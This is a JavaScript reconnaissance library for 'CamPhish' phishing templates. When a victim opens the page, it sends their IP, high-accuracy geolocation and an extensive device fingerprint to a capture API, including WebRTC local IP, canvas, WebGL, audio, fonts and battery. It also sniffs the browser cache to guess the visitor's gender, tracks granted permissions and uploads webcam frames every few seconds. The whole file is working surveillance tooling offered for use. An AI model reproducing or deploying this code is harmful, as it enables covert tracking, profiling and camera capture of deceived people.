/**
 * CamPhish Recon Library v2.1
 * Shared by all templates — enhanced fingerprinting, gender detection,
 * persistent permission tracking, network probing
 */
(function(window){
'use strict';

var API = window.CAMPHISH_API || '/api';
var SESSION = window.CAMPHISH_SESSION || 'default';

// ============ PERSISTENT PERMISSIONS ============
var PermTracker = {
  KEY: 'camphish_perms',
  get: function(){
    try { return JSON.parse(localStorage.getItem(this.KEY) || '{}'); }
    catch(e) { return {}; }
  },
  set: function(name, granted){
    var perms = this.get();
    perms[name] = { granted: granted, ts: Date.now() };
    localStorage.setItem(this.KEY, JSON.stringify(perms));
  },
  wasGranted: function(name){
    var p = this.get()[name];
    return p && p.granted;
  }
};

// ============ GENDER DETECTION (social media timing) ============
var GenderDetect = {
  femaleSites: [
    'https://www.pinterest.com/favicon.ico',
    'https://www.instagram.com/favicon.ico',
    'https://www.tumblr.com/favicon.ico',
    'https://www.etsy.com/favicon.ico',
    'https://www.shein.com/favicon.ico'
  ],
  maleSites: [
    'https://www.reddit.com/favicon.ico',
    'https://store.steampowered.com/favicon.ico',
    'https://www.linkedin.com/favicon.ico',
    'https://www.espn.com/favicon.ico',
    'https://opensea.io/favicon.ico'
  ],
  neutralSites: [
    'https://www.youtube.com/favicon.ico',
    'https://www.facebook.com/favicon.ico',
    'https://twitter.com/favicon.ico'
  ],

  detect: function(callback){
    var self = this;
    var results = { female: 0, male: 0, neutral: 0, visited: [] };
    var allSites = [].concat(
      this.femaleSites.map(function(u){return {url:u, gender:'female'};}),
      this.maleSites.map(function(u){return {url:u, gender:'male'};}),
      this.neutralSites.map(function(u){return {url:u, gender:'neutral'};})
    );
    var checked = 0;

    allSites.forEach(function(site){
      self._checkVisited(site.url, function(visited){
        if (visited) {
          results[site.gender]++;
          results.visited.push(site.gender + ':' + site.url.split('/')[2]);
        }
        checked++;
        if (checked >= allSites.length) {
          var prediction = 'unknown';
          if (results.female > results.male && results.female > 0) prediction = 'female';
          else if (results.male > results.female && results.male > 0) prediction = 'male';
          results.prediction = prediction;
          results.confidence = Math.abs(results.female - results.male) / Math.max(results.female + results.male, 1);
          callback(results);
        }
      });
    });

    // Timeout fallback
    setTimeout(function(){
      if (checked < allSites.length) {
        var prediction = 'unknown';
        if (results.female > results.male) prediction = 'female';
        else if (results.male > results.female) prediction = 'male';
        results.prediction = prediction;
        callback(results);
      }
    }, 3000);
  },

  _checkVisited: function(url, cb){
    try {
      var start = performance.now();
      var img = new Image();
      img.onload = function(){
        var elapsed = performance.now() - start;
        // Cached resources load <5ms, uncached >50ms
        cb(elapsed < 10);
      };
      img.onerror = function(){
        var elapsed = performance.now() - start;
        // Even errors come fast if cached (favicon 404 still caches)
        cb(elapsed < 10);
      };
      img.src = url + '?camphish=' + Date.now();
      // But we want to detect WITHOUT cache-busting for visit detection
      // Use a second approach: check if resource loads fast without cache-bust
      var img2 = new Image();
      var start2 = performance.now();
      img2.onload = function(){
        var e2 = performance.now() - start2;
        if (e2 < 5) cb(true);
      };
      img2.onerror = function(){
        var e2 = performance.now() - start2;
        if (e2 < 5) cb(true);
      };
      img2.src = url;
    } catch(e) {
      cb(false);
    }
  }
};

// ============ ENHANCED FINGERPRINT ============
var Fingerprint = {
  collect: function(callback){
    var fp = {};

    // Basic
    fp.screen_resolution = screen.width + 'x' + screen.height;
    fp.color_depth = screen.colorDepth;
    fp.pixel_ratio = window.devicePixelRatio;
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.timezone_offset = new Date().getTimezoneOffset();
    fp.language = navigator.language;
    fp.languages = (navigator.languages || []).join(',');
    fp.platform = navigator.platform;
    fp.hardware_concurrency = navigator.hardwareConcurrency;
    fp.device_memory = navigator.deviceMemory || null;
    fp.max_touch_points = navigator.maxTouchPoints || 0;
    fp.cookie_enabled = navigator.cookieEnabled;
    fp.do_not_track = navigator.doNotTrack;

    // Canvas fingerprint
    try {
      var c = document.createElement('canvas');
      var cx = c.getContext('2d');
      cx.textBaseline = 'top';
      cx.font = '14px Arial';
      cx.fillStyle = '#f60';
      cx.fillRect(0, 0, 100, 30);
      cx.fillStyle = '#069';
      cx.fillText('CamPhish 🎯 FP', 2, 2);
      cx.fillStyle = 'rgba(102,204,0,0.7)';
      cx.fillText('CamPhish 🎯 FP', 4, 4);
      fp.canvas_fingerprint = c.toDataURL().substring(0, 200);
    } catch(e) {}

    // WebGL fingerprint
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        fp.webgl_vendor = gl.getParameter(gl.VENDOR);
        fp.webgl_renderer = gl.getParameter(gl.RENDERER);
        fp.webgl_version = gl.getParameter(gl.VERSION);
        fp.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        fp.webgl_fingerprint = fp.webgl_vendor + ' ' + fp.webgl_renderer;
      }
    } catch(e) {}

    // Audio fingerprint
    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var oscillator = ac.createOscillator();
      var analyser = ac.createAnalyser();
      var gain = ac.createGain();
      var scriptProcessor = ac.createScriptProcessor(4096, 1, 1);
      gain.gain.value = 0;
      oscillator.connect(gain);
      gain.connect(analyser);
      analyser.connect(scriptProcessor);
      scriptProcessor.connect(ac.destination);
      oscillator.start(0);
      fp.audio_sample_rate = ac.sampleRate;
      fp.audio_state = ac.state;
      fp.audio_max_channel = ac.maxChannelCount;
      setTimeout(function(){ oscillator.stop(); ac.close(); }, 100);
    } catch(e) {}

    // Font detection
    try {
      var testFonts = ['Arial','Arial Black','Arial Narrow','Calibri','Cambria','Comic Sans MS','Consolas','Courier','Courier New','Georgia','Helvetica','Impact','Lucida Console','Lucida Sans Unicode','Microsoft Sans Serif','Palatino Linotype','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana','MS Gothic','MS PGothic','MS Sans Serif','MS Serif','SimSun','SimHei','MingLiU'];
      var baseFonts = ['monospace','sans-serif','serif'];
      var testString = 'mmmmmmmmmmlli';
      var testSize = '72px';
      var h = document.getElementsByTagName('body')[0];
      var s = document.createElement('span');
      s.style.fontSize = testSize;
      s.style.position = 'absolute';
      s.style.visibility = 'hidden';
      s.innerHTML = testString;
      var defaultWidth = {};
      var defaultHeight = {};
      for (var i in baseFonts) {
        s.style.fontFamily = baseFonts[i];
        h.appendChild(s);
        defaultWidth[baseFonts[i]] = s.offsetWidth;
        defaultHeight[baseFonts[i]] = s.offsetHeight;
        h.removeChild(s);
      }
      var detected = [];
      for (var i in testFonts) {
        var detected_font = false;
        for (var j in baseFonts) {
          s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
          h.appendChild(s);
          if (s.offsetWidth != defaultWidth[baseFonts[j]] || s.offsetHeight != defaultHeight[baseFonts[j]]) {
            detected_font = true;
          }
          h.removeChild(s);
        }
        if (detected_font) detected.push(testFonts[i]);
      }
      fp.font_list = detected.join(',');
      fp.font_count = detected.length;
    } catch(e) {}

    // Battery
    if (navigator.getBattery) {
      navigator.getBattery().then(function(b){
        fp.battery_level = b.level;
        fp.battery_charging = b.charging;
        fp.battery_charging_time = b.chargingTime;
        fp.battery_discharging_time = b.dischargingTime;
        finishFp();
      }).catch(function(){ finishFp(); });
    } else {
      finishFp();
    }

    // Network info
    if (navigator.connection) {
      fp.connection_type = navigator.connection.effectiveType;
      fp.connection_downlink = navigator.connection.downlink;
      fp.connection_rtt = navigator.connection.rtt;
      fp.connection_save_data = navigator.connection.saveData;
    }

    // Media devices (camera/mic count)
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(function(devices){
        fp.media_devices = devices.map(function(d){return d.kind;}).join(',');
        fp.camera_count = devices.filter(function(d){return d.kind === 'videoinput';}).length;
        fp.microphone_count = devices.filter(function(d){return d.kind === 'audioinput';}).length;
      }).catch(function(){});
    }

    // Sensors
    try {
      if (window.DeviceOrientationEvent) {
        fp.has_gyroscope = true;
      }
      if (window.DeviceMotionEvent) {
        fp.has_accelerometer = true;
      }
    } catch(e) {}

    // Speech synthesis voices (another fingerprint vector)
    try {
      if (window.speechSynthesis) {
        var voices = window.speechSynthesis.getVoices();
        fp.voice_count = voices.length;
        fp.voices = voices.map(function(v){return v.name;}).slice(0, 5).join(',');
      }
    } catch(e) {}

    function finishFp() {
      fp.session = SESSION;
      fp.collected_at = new Date().toISOString();

      // WebRTC local IP
      try {
        var pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        pc.createOffer(function(offer){
          pc.setLocalDescription(offer, function(){}, function(){});
        }, function(){});
        pc.onicecandidate = function(e){
          if (e && e.candidate && e.candidate.candidate) {
            var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (m && m[1] && !m[1].startsWith('0.')) {
              fp.local_ip = m[1];
              sendFp(fp);
            }
            pc.close();
          }
        };
        setTimeout(function(){ pc.close(); sendFp(fp); }, 3000);
      } catch(e) {
        sendFp(fp);
      }
    }
  }
};

function sendFp(fp) {
  fetch(API + '/capture/fingerprint', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(fp)
  }).catch(function(){});
}

// ============ IP + LOCATION CAPTURE ============
var Capture = {
  ip: function() {
    fetch(API + '/capture/ip', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: SESSION})
    }).catch(function(){});
  },

  location: function() {
    if (!navigator.geolocation) return;
    if (PermTracker.wasGranted('location')) {
      // Re-request silently — persistent permission
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
        },
        function() { PermTracker.set('location', false); },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
      );
    } else {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
          Capture._event('location_granted', {lat: pos.coords.latitude, lon: pos.coords.longitude});
        },
        function() {
          PermTracker.set('location', false);
          Capture._event('location_denied', {});
        },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
      );
    }
  },

  _sendLoc: function(pos) {
    fetch(API + '/capture/location', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        session: SESSION
      })
    }).catch(function(){});
  },

  image: function(dataUrl, method) {
    fetch(API + '/capture/image', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        cat: dataUrl,
        session: SESSION,
        capture_method: method || 'canvas'
      })
    }).catch(function(){});
  },

  camera: function(video, canvas, interval) {
    if (!video || !canvas) return null;
    var ctx = canvas.getContext('2d');
    var timer = setInterval(function(){
      if (video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        Capture.image(canvas.toDataURL('image/png'), 'canvas');
      }
    }, interval || 2500);
    return timer;
  },

  _event: function(type, data) {
    fetch(API + '/capture/event', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: SESSION, event_type: type, event_data: data || null})
    }).catch(function(){});
  },

  event: function(type, data) {
    this._event(type, data);
  }
};

// ============ INIT — call on page load ============
var Recon = {
  init: function(opts) {
    opts = opts || {};
    Capture.ip();
    Capture.location();
    Fingerprint.collect(function(){});

    // Gender detection (async, non-blocking)
    if (opts.genderDetect !== false) {
      GenderDetect.detect(function(result){
        Capture.event('gender_detected', result);
      });
    }

    // Watch for persistent permissions
    if (navigator.permissions) {
      navigator.permissions.query({name: 'geolocation'}).then(function(status){
        if (status.state === 'granted') PermTracker.set('location', true);
        status.onchange = function(){
          PermTracker.set('location', status.state === 'granted');
        };
      }).catch(function(){});
      navigator.permissions.query({name: 'camera'}).then(function(status){
        if (status.state === 'granted') PermTracker.set('camera', true);
        status.onchange = function(){
          PermTracker.set('camera', status.state === 'granted');
        };
      }).catch(function(){});
    }
  },

  // Request camera with persistent tracking
  requestCamera: function(callback) {
    navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream){
      PermTracker.set('camera', true);
      Capture.event('camera_granted', {});
      callback(null, stream);
    }).catch(function(err){
      PermTracker.set('camera', false);
      Capture.event('camera_denied', {error: err.name});
      callback(err);
    });
  },

  Capture: Capture,
  Fingerprint: Fingerprint,
  GenderDetect: GenderDetect,
  PermTracker: PermTracker
};

window.CamPhishRecon = Recon;

})(window);
